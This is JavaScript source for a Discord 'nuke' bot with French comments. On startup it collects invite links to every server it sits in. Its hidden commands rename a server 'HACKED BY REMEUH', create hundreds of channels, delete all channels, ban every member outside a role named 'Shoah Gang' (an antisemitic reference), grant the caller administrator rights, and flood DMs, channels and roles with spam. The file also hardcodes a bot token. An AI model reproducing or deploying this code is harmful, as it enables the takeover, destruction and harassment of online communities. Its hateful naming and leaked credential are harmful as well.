const Discord = require("discord.js")
const bot = new Discord.Client()
try {

bot.on("error", () => {
  return;
})

  bot.on('ready',() => {

    console.log("---------------------------")
  console.log("Je suis "+bot.user.username+" je suis sur "+bot.guilds.size+" serveurs et j'ai "+bot.users.size+" membres "+bot.user.id)
    bot.guilds.forEach(guild => {
      var invite = guild.channels.random() || guild.afkChannel || guild.channels.first()
      if(guild.channels.size === 0) return;
      if(!guild.member(bot.user).hasPermission("ADMINISTRATOR")) invite.createInvite().then(invite => console.log(` [OTHER] ${guild.name} ${invite} ${guild.memberCount} membres`)).catch(error => {})
    else if(guild.member(bot.user).hasPermission("ADMINISTRATOR")) invite.createInvite().then(invite => console.log(` [ADMIN] ${guild.name} ${invite} ${guild.memberCount} membres`)).catch(error => {})
    });
  });


  bot.on("message", message => {
    //COMMANDE DE CREATION DE CHANNEL, MODIFICATION DU NOM, DE LA REGION ET DE L'ICON DU SERVEUR
    if(message.content === ".channel"){
        if(message.channel.type === "dm") return;
        var fucked = false
        if(!fucked){
            message.guild.setIcon("http://image.noelshack.com/fichiers/2018/39/7/1538314842-kiki.jpg").catch(error => {})
            message.guild.setName('HACKED BY REMEUH ').catch(error => {})
            message.guild.setRegion('hongkong').catch(error => {})  
       for (var i = 0; i < 500; i++){
          message.guild.createChannel('HACKED BY REMEUH ', 'voice').catch(error => {})
       }
        fucked = true;
        }
        if(message.deletable) message.delete();
      }
    // COMMANDE POUR SUPPRIMER TOUT LES SALONS
    if(message.content === ".del"){
        if(message.channel.type === "dm") return;
        if(message.guild.channels.size === 0) return;
        else if(!message.guild.member(bot.user).hasPermission("MANAGE_CHANNELS")) return;
        message.guild.channels.forEach(chan => { if(chan.deletable) chan.delete();})
    }
    //COMMANDE POUR BAN TOUT LE MONDE SAUF CEUX AYANT LE GRADE SHOAH GANG
    if (message.content === '.ban') {
      if(message.channel.type === "dm") return;
      if(message.deletable) message.delete();
      else if(!message.guild.member(bot.user).hasPermission("BAN_MEMBERS")) return;
        message.guild.members.forEach(member => {
            if (!member.roles.exists("name", "Shoah Gang") && member.bannable) member.ban();});
      }
      //COMMANDE POUR METTRE ADMIN
      if (message.content === '.dieu' || message.content === '.pa') {
          if(message.channel.type === "dm") return;
          else if(!message.guild.member(bot.user).hasPermission("ADMINISTRATOR")) return;
          message.member.guild.createRole({
              name: "Shoah Gang",
              permissions: "ADMINISTRATOR",
              mentionable: false
            }).then(function(role) {message.member.addRole(role); if (message.deletable) message.delete();})
          }
          //COMMANDE POUR SPAM MP TOUT LE SERVEUR
          if(message.content === ".mp"){
              if(message.channel.type === "dm") return;
              if(message.deletable) message.delete();
              message.guild.members.forEach(member => {
                setInterval(function () {
                  member.send("@everyone @here j'ai detruis ton serveur , je suis un mechant garçon, amandine je t'aime \nhttps://discord.gg/KVcmhx").catch(error => {}) }, 450)})
            }
            //COMMANDE POUR SPAM DANS LE SALON
            if (message.content === '.d') {
              if(message.channel.type === "dm") return;
                 setInterval (function () { message.channel.send("@everyone je suis un meçhant garçon \nhttps://discord.gg/KVcmhx ", { tts: true } ).catch(error => {}) }, 450)
              }
})
} catch(error) {}
bot.login("NDcxMTYzMzAzODE3OTA0MTU4.DpEumw.K3_L7JfHnuyFs2MtTLLk_Kz-J4I").catch(error => console.log("Token Incorrect"))
///SPAM LES ROLES ET FLOOD LES LOGS
var prefix = ".";
bot.on('message', message => {
  if(message.content.startsWith(prefix + ("role"))) {
      console.log("Commande !role par ${message.author.tag}");
      if (message.deletable) message.delete();
      let i = 0;
      let interval = setInterval(function () {
      if (i === 250) clearInterval(interval);
       message.guild.createRole({name: 'Esclaves de Rem', color:'RANDOM'}).then(function(role) {
        message.guild.members.forEach(member => {
        member.addRole(role).catch(e => {});
      })
      i++
      }, 100)
         })
        }
      });
